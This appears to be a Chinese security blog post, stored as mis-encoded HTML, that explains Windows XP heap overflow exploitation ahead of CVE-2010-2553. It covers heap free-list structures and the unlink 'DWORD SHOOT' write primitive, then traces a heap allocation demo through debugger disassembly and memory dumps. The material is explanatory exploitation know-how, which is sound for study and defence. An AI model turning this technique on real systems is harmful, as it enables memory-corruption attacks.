<!DOCTYPE html>
<html>


    <head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
<title>æ¼æ´æˆ˜äº‰-cve-2010-2553</title>
<meta name="description" content="A blog about programming and network security">

<link rel="profile" href="https://gmpg.org/xfn/11" />
<link rel="stylesheet" href="/css/my_code.css">
<!-- below font-awesome.css can not be replaced by local file,error will occur -->
<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">

<link href="https://fonts.googleapis.com/css?family=Great+Vibes" rel="stylesheet">

<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
<link rel="stylesheet" href="/css/highlightjs.piperita.css">

<!-- Favicons generated at https://realfavicongenerator.net/ -->
<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
<link rel="manifest" href="/favicons/manifest.json">
<link rel="shortcut icon" href="/favicons/favicon.ico">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
<meta name="msapplication-config" content="/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">

<!--
<!-- ä¸‹é¢è¿™å¥æ˜¯æ·»åŠ åœ¨çº¿ä¸­æ–‡å­—ä½“:æ–‡æ³‰é©¿ç­‰å®½æ­£é»‘ -->
<script type="text/javascript" src="//cdn.webfont.youziku.com/wwwroot/js/wf/youziku.api.min.js"></script>
-->






</head>


    <body>

    <nav id="my-menu">
  <div>
    <p style="font-family: 'Great Vibes', cursive;">quanyechavshuo</p>


    
    <center style="margin-top:180%">
    <font color="red" align="center"><i class="fa fa-link" aria-hidden="true"></i><a href="../../../../../bookmarks.html"><font color="red"> link</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-key" aria-hidden="true"></i><a href="../../../../../book.html" target="_top"><font color="red"> book</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-caret-square-o-right" aria-hidden="true"></i><a href="../../../../../mv.html" target="_top"><font color="red"> movie</font></a></font>
    </center>
    <p class="links">
  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
</p>

  </div>
</nav>
<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>



    <div class="page-content">
      <div class="wrap">
      

<div class="container-fluid single">
  <div class="row">

    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
      

      <h1 class="header" itemprop="name">æ¼æ´æˆ˜äº‰-cve-2010-2553</h1>

      <div class="author">
        <small><i>
          
          on <span itemprop="datePublished" content="2014-08-28">August 17, 2016</span>
           under äºŒè¿›åˆ¶
        </i></small>
      </div>

      <div class="read-time">
        <small>
          30 minute read
        </small>
      </div>

      <div class="content-panel content">

        

        <span itemprop="articleBody"><h3 id="0x00-å †æº¢å‡ºåŸºç¡€çŸ¥è¯†">0x00 å †æº¢å‡ºåŸºç¡€çŸ¥è¯†</h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt;good link:
    http://blog.csdn.net/ithzhang/article/details/12711431
    http://www.mottoin.com/87277.html
    http://www.voidcn.com/blog/u010797814/article/p-3924286.html

2&gt;å †è¡¨åªç´¢å¼•æ‰€æœ‰çš„ç©ºé—²æ€å †å—,å·²åˆ†é…|å ç”¨çš„å †å—ç”±ä½¿ç”¨å®ƒçš„ç¨‹åºç´¢å¼•,ç©ºé—²æ€å †å—å’Œå ç”¨æ€å †å—:

    å †å—ä½¿ç”¨_HEAP_ENTYRç»“æ„æ¥æè¿°,è¯¥ç»“æ„å 8Byte. _HEAP_ENTRYç»“æ„ä¹‹åå°±æ˜¯ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„åŒºåŸŸ.è°ƒç”¨HeapAllocå‡½æ•°
    å°†è¿”å›HEAP_ENTRYä¹‹åçš„åœ°å€.æ­¤åœ°å€å‡å»8Byteä¾¿å¯ä»¥å¾—åˆ°_HEAP_ENTRYç»“æ„.å¯¹äºå·²ç»é‡Šæ”¾çš„å †å—,å †ç®¡ç†å™¨å®šä¹‰äº†
    _HEAP_FREE_ENTRYç»“æ„æ¥æè¿°.è¯¥ç»“æ„çš„å‰å…«ä¸ªå­—èŠ‚ä¸_HEAP_ENTRYç»“æ„å®Œå…¨ç›¸åŒ.ä½†å¢åŠ äº†8ä¸ªå­—èŠ‚æ¥å­˜å‚¨ç©ºé—²é“¾è¡¨çš„å¤´èŠ‚ç‚¹.
    _HEAP_FREE_ENTRYæ˜¯ç©ºé—²æ€å †å—ä¸­çš„å—é¦–(8byte)ä¸flink,blink(4+4=8)çš„æ€»å’Œ,_HEAP_FREE_ENTRYå…±16byte,_HEAP_ENTRY
    æ˜¯å ç”¨æ€å †å—ä¸­å¯¹åº”çš„å—é¦–çš„ç»“æ„,å¤§å°ä¸º8byte.
    å¦‚ä¸‹å›¾:
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/heap-1.png" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3&gt;å †æº¢å‡ºå®è´¨:
    [alloc(HeapAlloc,malloc)å¯¹åº”unlink]
    [freeå¯¹åº”link]

    ä¸€ä¸ªç©ºé—²å †å—(è®¾ä¸ºblockå †å—)çš„å¸ä¸‹(allocate)å¿…å®šå¯¹åº”å¦‚ä¸‹æ“ä½œ:

    block.blink.flink=block.flink
    block.flink.blink=block.blink

    ä¹Ÿå³ç›¸å½“äºè¿™ä¸ªå †å—æœ‰å¦‚ä¸‹æ“ä½œ:
    [flink+4]=blink
    [blink]=flink

    å…¶ä¸­flinkä»£è¡¨ä¸‹ä¸€ä¸ªå †å—çš„ç´¢å¼•,blinkä»£è¡¨å‰ä¸€ä¸ªå †å—çš„ç´¢å¼•

    é€šå¸¸ä¸€ä¸ªå †å—çš„åˆ†é…(HeapAlloc)å¯¹åº”ä¸€ä¸ªç©ºé—²å †å—çš„å¸ä¸‹,ä¹Ÿå³å¯¹åº”ä¸€ä¸ªDWORD SHOOTæœºä¼š,å¯ä»¥åœ¨è¿™ä¸ªå †å—åˆ†é…å‰é€šè¿‡
    memcopy,strcpyç­‰æ“ä½œå°†è¿™ä¸ªåœ¨åˆ†é…å‰è¿˜å¤„äºç©ºé—²æ€çš„å †å—çš„flinkå’Œblinkè¦†ç›–æˆä»»æ„æ•°æ®,è¿™ä¸ªç©ºé—²æ€å †å—ä¸€æ—¦å‘ç”Ÿåˆ†é…
    ,å°†å¯¹åº”DWORD SHOOT

    0day2ä¸­p169é¡µä¸­çš„"äº‹å®ä¸Š,å †å—çš„åˆ†é…,é‡Šæ”¾,åˆå¹¶æ“ä½œéƒ½èƒ½å¼•å‘DWORD SHOOT,ç”šè‡³å¿«è¡¨ä¹Ÿå¯ä»¥è¢«ç”¨
    æ¥åˆ¶é€ DWORD SHOOT"çš„è¯´æ³•æœ‰å¾…è€ƒé‡,åˆ°ç›®å‰,ç¬”è€…åªè®¤åŒä¸€ä¸ªç©ºé—²å †å—çš„å¸ä¸‹,ä¹Ÿå³å¯¹åº”0day2è¿™å¥è¯ä¸­çš„"å †å—çš„åˆ†é…"èƒ½
    å¼•å‘DWORD SHOOT
    update:2017/1/12
    å­¦ä¹ Double Freeåå‘ç°å †å—çš„é‡Šæ”¾ä¹Ÿå¯ä»¥åˆ¶é€ å‡ºä¸€ä¸ªç©ºé—²å †å—çš„å¸ä¸‹,åªè¦è¿™ä¸ªè¦é‡Šæ”¾çš„å †å—ç›¸é‚»å†…å­˜æœ‰ä¸€ä¸ªç©ºé—²å †å—,è¿™
    æ ·å°±ä¼šç”±free[å¯¹åº”link]åˆ¶é€ å‡ºunlinkå†link,è€Œunlinkå¯¹åº”DWORD SHOOT


4&gt;è°ƒè¯•å †ä¸è°ƒè¯•æ ˆä¸åŒ,ä¸èƒ½ç›´æ¥ç”¨è°ƒè¯•å™¨æ¥åŠ è½½ç¨‹åº,å¦åˆ™å †ç®¡ç†å‡½æ•°ä¼šæ£€æµ‹åˆ°å½“å‰è¿›ç¨‹å¤„äºè°ƒè¯•çŠ¶æ€,è€Œä½¿ç”¨è°ƒè¯•æ€å †ç®¡ç†
  ç­–ç•¥
</code></pre></div></div>

<h3 id="0x01-å †æº¢å‡ºåŸç†">0x01 å †æº¢å‡ºåŸç†</h3>

<h4 id="10day2å®ä¾‹">1&gt;0day2å®ä¾‹</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ç³»ç»Ÿ:winxp sp3+vc6.0

-----------------0dayheap.c-(page:152)--------
#include &lt;windows.h&gt;
int main()
{
    HLOCAL h1,h2,h3,h4,h5,h6;
    HANDLE hp;
    getchar();//å°†ä¹¦ä¸­ä¸‹é¢çš„__asm int 3æ”¹æˆè¿™é‡Œçš„getchar(),å› ä¸ºå®é™…ä¸­å°†odè®¾ä¸ºå®æ—¶è°ƒè¯•æç¤ºæœ‰é—®é¢˜
    hp=HeapCreate(0,0x1000,0x10000);//åˆ›å»ºä¸€ä¸ª0x1000=4096å¤§å°çš„å †
    //__asm int 3,ä¹¦ä¸­æ˜¯__asm int 3,åœ¨winxp sp3ä¸Šæµ‹è¯•ä¸­æ–­æ•ˆæœè¿˜å¥½,æ”¹æˆä¸Šé¢çš„getchar()

    h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
    h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,5);
    h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,6);
    h4=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    h5=HeapAlloc(hp,HEAP_ZERO_MEMORY,19);
    h6=HeapAlloc(hp,HEAP_ZERO_MEMORY,24);

    //free block and prevent coaleses
    HeapFree(hp,0,h1);//free to freelist[2]
    HeapFree(hp,0,h3);//free to freelist[2]
    HeapFree(hp,0,h5);//free to freelist[4]

    HeapFree(hp,0,h4);//coalese h3,h4,h5,link the large block to freelist[8]

    return 0;
}
--------------------end-----------------------

ç¼–è¯‘æˆreleaseç‰ˆæœ¬exe
åŒå‡»è¿è¡Œ0dayheap.exe
odé™„åŠ 
f9
alt+eé€‰æ‹©0dayheap.exe
åœ¨00401018çš„call HeapCreateå¤„ä¸‹æ–­

    00401018    FF15 08604000   call dword ptr ds:[&lt;&amp;KERNEL32.HeapCreate&gt;; kernel32.HeapCreate
    0040101E    8B3D 04604000   mov edi,dword ptr ds:[&lt;&amp;KERNEL32.HeapAll&gt;; ntdll.RtlAllocateHeap
    
åœ¨0dayheap.exeçš„çª—å£ä¸­è¾“å…¥"a",enter
å‘ç°odæ²¡æœ‰æˆåŠŸä¸­æ–­,å¯èƒ½æ˜¯odçš„åŸå› 
alt+v
t
resume all threads
ä¸­æ–­åœ¨401018å¤„
f8
    æ­¤æ—¶eax=3a0000,ä¹Ÿå³heapcreateåˆ›å»ºçš„å †çš„èµ·å§‹åœ°å€ä¸º3a0000
åœ¨å¯„å­˜å™¨çª—å£ä¸­å³é”®eax,åœ¨æ•°æ®çª—å£ä¸­è·Ÿéš

    003A0000  C8 00 00 00 7A 01 00 00 FF EE FF EE 00 10 00 00  ?..z..ï£µ??..
    003A0010  00 00 00 00 00 FE 00 00 00 00 10 00 00 20 00 00  .....?..... ..
    003A0020  00 02 00 00 00 20 00 00 30 01 00 00 FF EF FD 7F  .... ..0..ï£µç¨
    003A0030  05 00 08 06 00 00 00 00 00 00 00 00 00 00 00 00  .............
    003A0040  00 00 00 00 98 05 3A 00 0F 00 00 00 F8 FF FF FF  ....?:....?ï£µï£µ
    003A0050  50 00 3A 00 50 00 3A 00 40 06 3A 00 00 00 00 00  P.:.P.:.@:.....
    003A0060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    003A0070  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

alt+mä¹Ÿå¯ä»¥æŸ¥çœ‹å †çš„èµ·å§‹åœ°å€,å¦‚ä¸‹å›¾
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/heap-2.png" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>åœ¨003a000é‚£ä¸€è¡Œä¸Šå³é”®å¤åˆ¶ä¸€è¡Œ,ç²˜è´´å¦‚ä¸‹:
    Memory map, æ¡ç›® 15
     åœ°å€=003A0000
     å¤§å°=00001000 (4096.)
     å±ä¸»=         003A0000 (è‡ªèº«)
     åŒºæ®µ=
     ç±»å‹=Priv 00021004
     è®¿é—®=RW
     åˆå§‹è®¿é—®=RW

åœ¨æ•°æ®çª—å£ä¸­çš„003a0000çš„0x178åç§»ä¹Ÿå³3a0178,æ˜¯ç©ºè¡¨ç´¢å¼•,ä¹Ÿå³3a0178æŒ‡å‘freelist,3a0178å¤„çš„å€¼ä¸ºfreelistçš„ç¬¬ä¸€é¡¹å†…å®¹,å¦‚ä¸‹:
    
    003A0170  00 00 00 00 00 00 00 00      88 06 3A 00 88 06 3A 00  ........?:.?:.

    free[0]=0x003a0178
    free[0].flink=[3a0178]=003a0688
    free[0].blink=[3a0178+4]=003a0688

003a0688å¤„çš„æ•°æ®çª—å£å€¼å¦‚ä¸‹:

    003A0688  78 01 3A 00 78 01 3A 00 00 00 00 00 00 00 00 00  x:.x:.........
    003A0698  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

    free[-1]=0x003a0688
    free[-1].flink=[3a0688]=003a0178    ====free[0]
    free[-1].blink=[3a0688+4]=003a0178
    
    å¯ä»¥çœ‹å‡ºHeapCreateäº§ç”Ÿçš„å †ä¸­çš„ç©ºè¡¨åªæœ‰ä¸¤é¡¹,ä¹Ÿå³åªæœ‰ä¸€ä¸ªå †å—,ä¸”å †å—ç´¢å¼•ä¸ºfree[-1]+8=0x003a0690
    h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,3);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h1=0x3a0690
    h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,5);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h2=0x3a0690+16=0x3a06a0
    h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,6);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h3=0x3a0690+16*2=0x3a06b0
    h4=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h4=0x3a0690+16*3=0x3a06c0
    h5=HeapAlloc(hp,HEAP_ZERO_MEMORY,19);//å®é™…åˆ†é…32å­—èŠ‚(4ä¸ªå †å—å¤§å°),é¢„æµ‹h5=0x3a0690+16*4=0x3a06d0
    h6=HeapAlloc(hp,HEAP_ZERO_MEMORY,24);//å®é™…åˆ†é…32å­—èŠ‚(4ä¸ªå †å—å¤§å°),é¢„æµ‹h6=0x3a0690+16*4+32=0x3a06f0
    h1-h6å…±åˆ†é…128ä¸ªå­—èŠ‚,128/8=16ä¸ªå †å•å…ƒ

åœ¨å…­å¤„HeapAllocä¸Šä¸‹æ–­

    00401018    FF15 08604000   call dword ptr ds:[&lt;&amp;KERNEL32.HeapCreate&gt;]          ; kernel32.HeapCreate
    0040101E    8B3D 04604000   mov edi,dword ptr ds:[&lt;&amp;KERNEL32.HeapAlloc&gt;]        ; ntdll.RtlAllocateHeap
    00401024    8BF0            mov esi,eax
    00401026    6A 03           push 0x3
    00401028    6A 08           push 0x8
    0040102A    56              push esi
    0040102B    FFD7            call edi     --------&gt;f2
    0040102D    6A 05           push 0x5
    0040102F    6A 08           push 0x8
    00401031    56              push esi
    00401032    8BD8            mov ebx,eax
    00401034    FFD7            call edi     --------&gt;f2
    00401036    6A 06           push 0x6
    00401038    6A 08           push 0x8
    0040103A    56              push esi
    0040103B    FFD7            call edi     --------&gt;f2
    0040103D    6A 08           push 0x8
    0040103F    6A 08           push 0x8
    00401041    56              push esi
    00401042    8BE8            mov ebp,eax
    00401044    FFD7            call edi     --------&gt;f2
    00401046    6A 13           push 0x13
    00401048    6A 08           push 0x8
    0040104A    56              push esi
    0040104B    894424 20       mov dword ptr ss:[esp+0x20],eax
    0040104F    FFD7            call edi     --------&gt;f2
    00401051    6A 18           push 0x18
    00401053    6A 08           push 0x8
    00401055    56              push esi
    00401056    894424 1C       mov dword ptr ss:[esp+0x1C],eax
    0040105A    FFD7            call edi     --------&gt;f2

f8
f8
..
(eip=0x40102d)
    åˆ°40102då¤„eax=0x3a0688,ä¹Ÿå³h1=0x3a0688,è¯´æ˜é¢„æµ‹é”™äº†,å› ä¸ºåˆ†é…ä¸Šé¢å”¯ä¸€çš„å †å—(free[-1]=003a0688)åˆ†é…ä»¥åå°±ä¸
    å†æ˜¯ç©ºé—²å †å—äº†,å˜æˆå ç”¨æ€çš„å †å—,å ç”¨æ€çš„å †å—æ˜¯æ²¡æœ‰flinkå’Œblikçš„,ä¹Ÿå³å ç”¨æ€çš„å †å—çš„ç´¢å¼•ä¸å±äºç©ºè¡¨ä¸­,å±äº
    åº”ç”¨ç¨‹åº.ä¸Šé¢å”¯ä¸€çš„å †å—åˆ†å‰²ä»¥åçš„å †å—æ˜¯åœ¨0x3a0688å¤„å‰²ä¸‹16ä¸ªå­—èŠ‚(h1çš„å¤§å°)åå‰©ä¸‹çš„å”¯ä¸€çš„å †å—
    ç°åœ¨0x3a688å¤„çš„æ•°æ®å¦‚ä¸‹:
        
    003A0688  00 00 00 00 78 01 3A 00 2E 01 02 00 00 10 00 00  ....x:......
    003A0698  78 01 3A 00 78 01 3A 00 00 00 00 00 00 00 00 00  x:.x:.........

    é‡æ–°é¢„æµ‹:
    h1=003a0688
        h1å †å—çš„å—é¦–åœ¨h1-8=3a0680å¤„:
        003A0680:
        02 00 08 00 AA 01 0D 00          ..?..
        å—é¦–çš„å‰2ä¸ªå­—èŠ‚å¯¹åº”å½“å‰å †å—çš„å¤§å°(å †å—çš„ä¸ªæ•°,æ¯ä¸ªå †å—å•ä½ä¸º8å­—èŠ‚å¤§å°),ç¬¬3-4ä¸ªå­—èŠ‚å¯¹åº”å‰ä¸€ä¸ªå †å—å¤§å°,è¿™
        é‡Œå‰2ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å½“å‰å †å—å¤§å°ä¸º2ä¸ªå †å—,ç¬¬3-4å­—èŠ‚ä¸º0008,å³å‰ä¸€ä¸ªå †å—å¤§å°ä¸º8ä¸ªå †å—
    h2=003a0698
    h3=003a06a8
    h4=003a06b8
    h5=003a06c8
    h6=003a06e8

f8
f8
...
(eip=00401036)
    åˆ°00401036å¤„eax=3a0698,ä¹Ÿå³h2=0x3a0698ä¸é¢„æµ‹ç»“æœä¸€è‡´,h2å †å—çš„å—é¦–åœ¨h2-8=3a0690å¤„:
    003a0690:
    02 00 02 00 A8 01 0B 00          ..?.
    å‰2ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å½“å‰å †å—å¤§å°ä¸º2,3-4ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    æ­¤æ—¶(h1,h2åˆ†é…å®Œæˆ,h3è¿˜æœªåˆ†é…)å¯¹åº”çš„ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh2+8+8=003a06a0+8=003a06a8,å…¶ä¸­003a06a0ä¸ºç©ºé—²
    å †å—å—é¦–çš„åœ°å€,ç©ºé—²å †å—çš„ç´¢å¼•ä¸ºå—é¦–+8å¤„,å…·ä½“å¦‚ä¸‹:

    003A0698  00 00 00 00 00 01 3A 00 2C 01 02 00 00 10 00 00  .....:.,....
    003A06A8  78 01 3A 00 78 01 3A 00 00 00 00 00 00 00 00 00  x:.x:.........
    003A06B8  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    ä¹Ÿå³ç©ºé—²å †å—çš„å—é¦–ä¸º2c 01 02 00 00 10 00 00==&gt;å½“å‰ç©ºé—²å †å—å¤§å°ä¸º012c,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    æ­¤æ—¶çš„free[-1]=3a06a8,free[-1].flink=[3a06a8]=free[-1].blink=[3a06b0]=003a0178,ä¾ç„¶ä¸ºfree[0]

f8
f8
...
(eip=0040103D)
    åˆ°0040103Då¤„eax=3a06a8,ä¹Ÿå³h3=0x3a06a8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h3å †å—çš„å—é¦–åœ¨h3-8=3a06a0å¤„:
    003A06A0  02 00 02 00 AE 01 0A 00 00 00 00 00 00 00 3A 00  ..?........:.
    å‰2ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å½“å‰å †å—çš„å¤§å°ä¸º2,3-4ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    æ­¤æ—¶(h1,h2,h3åˆ†é…å®Œæˆ,h4è¿˜æ²¡åˆ†é…)å¯¹åº”çš„ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh3+8+8=3a06b0+8=3a06b8,å…¶ä¸­003a06b0ä¸ºç©ºé—²å †
    å—å—é¦–çš„åœ°å€,ç©ºé—²å †å—çš„ç´¢å¼•ä¸ºå—é¦–+8å¤„,å…·ä½“å¦‚ä¸‹:
    003A06B0  2A 01 02 00 00 10 00 00 78 01 3A 00 78 01 3A 00  *....x:.x:.
    å½“å‰ç©ºé—²å †å—å¤§å°ä¸º012c-2=012a,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    åŒæ ·æ˜¯free[-1].flink=free[-1].blink=003a0178=free[0]

f8
f8
...
(eip=00401046)
    åˆ°00401046å¤„eax=3a06b8,ä¹Ÿå³h4=0x3a06b8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h4å †å—çš„å—é¦–åœ¨h4-8=30a6b0å¤„:
    003A06B0  02 00 02 00 AC 01 08 00 00 00 00 00 00 00 00 00  ..?.........
    å½“å‰å †å—å¤§å°ä¸º2,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    h4åˆ†é…å®Œ,h5è¿˜æ²¡åˆ†é…,ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh4+8+8=30a6c0+8=30a6c8
    æ•°æ®å¦‚ä¸‹:
    003A06C0  28 01 02 00 00 10 00 00 78 01 3A 00 78 01 3A 00  (....x:.x:.
    å½“å‰ç©ºé—²å †å—çš„å¤§å°ä¸º012a-2=0128,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    åŒæ ·æ˜¯free[-1].flink=free[-1].blink=003a0178=free[0]

f8
f8
...
(eip=00401051)
    åˆ°00401051å¤„eax=3a06c8,ä¹Ÿå³h5=0x3a06c8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h5å †å—çš„å—é¦–åœ¨h5-8=3a06c0å¤„:
    003A06C0  04 00 02 00 A2 01 0D 00 00 00 00 00 00 00 00 00  ..?..........
    å½“å‰å †å—çš„å¤§å°ä¸º4,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2

f8
f8
...
(eip=0040105c)
    åˆ°0040105cå¤„eax=3a06e8,ä¹Ÿå³h6=0x3a06e8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h6å †å—çš„å—é¦–åœ¨h6-8=3a06e0å¤„:
    003A06E0  04 00 04 00 A6 01 08 00 00 00 00 00 00 00 00 00  ..?.........
    å½“å‰å †å—å¤§å°ä¸º4,å‰ä¸€å †å—å¤§å°ä¸º4
    h6åˆ†é…å®Œ,ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh6+8*3+8=3a0700+8=3a0708
    æ•°æ®å¦‚ä¸‹:
    003A0700  20 01 04 00 00 10 00 00 78 01 3A 00 78 01 3A 00   ....x:.x:.
    å½“å‰ç©ºé—²å †å—çš„å¤§å°ä¸º0128-4-4=0120,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º4
    åŒæ ·æ˜¯free[-1].flink=free[-1].blink=003a0178=free[0]


åœ¨ä¸‹é¢çš„3ä¸ªå †å—é‡Šæ”¾(call heapfree,é‡Šæ”¾h1,h3,h5,h4)çš„å‡½æ•°ä¸‹æ–­

    0040105C    8B3D 00604000   mov edi,dword ptr ds:[&lt;&amp;KERNEL32.HeapFree&gt;]         ; ntdll.RtlFreeHeap
    00401062    53              push ebx
    00401063    6A 00           push 0x0
    00401065    56              push esi
f2  00401066    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    00401068    55              push ebp
    00401069    6A 00           push 0x0
    0040106B    56              push esi
f2  0040106C    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    0040106E    8B4424 10       mov eax,dword ptr ss:[esp+0x10]
    00401072    50              push eax
    00401073    6A 00           push 0x0
    00401075    56              push esi
f2  00401076    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    00401078    8B4C24 14       mov ecx,dword ptr ss:[esp+0x14]
    0040107C    51              push ecx                                            ; ntdll.7C9301BB
    0040107D    6A 00           push 0x0
    0040107F    56              push esi
    00401080    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    00401082    5F              pop edi                                             ; 00320036
    00401083    5E              pop esi                                             ; 00320036
    00401084    5D              pop ebp                                             ; 00320036
    00401085    33C0            xor eax,eax
    00401087    5B              pop ebx                                             ; 00320036
    00401088    83C4 08         add esp,0x8
    0040108B    C3              retn

f8
f8
...
(eip=401068)
    åˆ°401068å¤„,h1å †å—è¢«é‡Šæ”¾,ç”±äºh1å®é™…åˆ†é…å¤§å°ä¸º2ä¸ªå †å•å…ƒå¤§å°(2*8=16å­—èŠ‚),é‡Šæ”¾åå°†é“¾å…¥free[2]è¿™ä¸ªç©ºé—²é“¾è¡¨ä¸­
    ,åœ¨h1é‡Šæ”¾ä¹‹å‰åªæœ‰free[0]è¿™ä¸€ä¸ªç©ºé—²é“¾è¡¨,h1é‡Šæ”¾åä¼šå¢åŠ ä¸€ä¸ªç©ºé—²é“¾è¡¨free[2],æ­¤æ—¶free[2]è¿™ä¸ªç©ºè¡¨åªæœ‰ä¸€ä¸ªç»“ç‚¹,æ­¤
    æ—¶free[0]é™„è¿‘æ•°æ®:

    eip=40105cæ—¶,ä¹Ÿå³ä¸Šé¢é‡Šæ”¾h1ä¹‹å‰,free[0]=3a0178,é™„è¿‘çš„æ•°æ®å¦‚ä¸‹:

    003A0170  00 00 00 00 00 00 00 00 08 07 3A 00 08 07 3A 00  ........:.:.
    003A0180  80 01 3A 00 80 01 3A 00 88 01 3A 00 88 01 3A 00  â‚¬:.â‚¬:.?:.?:.
    003A0190  90 01 3A 00 90 01 3A 00 98 01 3A 00 98 01 3A 00  ?:.?:.?:.?:.
    003A01A0  A0 01 3A 00 A0 01 3A 00 A8 01 3A 00 A8 01 3A 00  ?:.?:.?:.?:.
    003A01B0  B0 01 3A 00 B0 01 3A 00 B8 01 3A 00 B8 01 3A 00  ?:.?:.?:.?:.
    003A01C0  C0 01 3A 00 C0 01 3A 00 C8 01 3A 00 C8 01 3A 00  ?:.?:.?:.?:.
    003A01D0  D0 01 3A 00 D0 01 3A 00 D8 01 3A 00 D8 01 3A 00  ?:.?:.?:.?:.
    003A01E0  E0 01 3A 00 E0 01 3A 00 E8 01 3A 00 E8 01 3A 00  ?:.?:.?:.?:.
    003A01F0  F0 01 3A 00 F0 01 3A 00 F8 01 3A 00 F8 01 3A 00  ?:.?:.?:.?:.
    
    ç°åœ¨,eip=401068æ—¶,åˆšé‡Šæ”¾å®Œh1,free[0]=3a0178,é™„è¿‘æ•°æ®å¦‚ä¸‹:

    003A0170  00 00 00 00 00 00 00 00 08 07 3A 00 08 07 3A 00  ........:.:.
    003A0180  80 01 3A 00 80 01 3A 00(88 06 3A 00 88 06 3A 00) â‚¬:.â‚¬:.?:.?:.
    003A0190  90 01 3A 00 90 01 3A 00 98 01 3A 00 98 01 3A 00  ?:.?:.?:.?:.
    003A01A0  A0 01 3A 00 A0 01 3A 00 A8 01 3A 00 A8 01 3A 00  ?:.?:.?:.?:.
    003A01B0  B0 01 3A 00 B0 01 3A 00 B8 01 3A 00 B8 01 3A 00  ?:.?:.?:.?:.
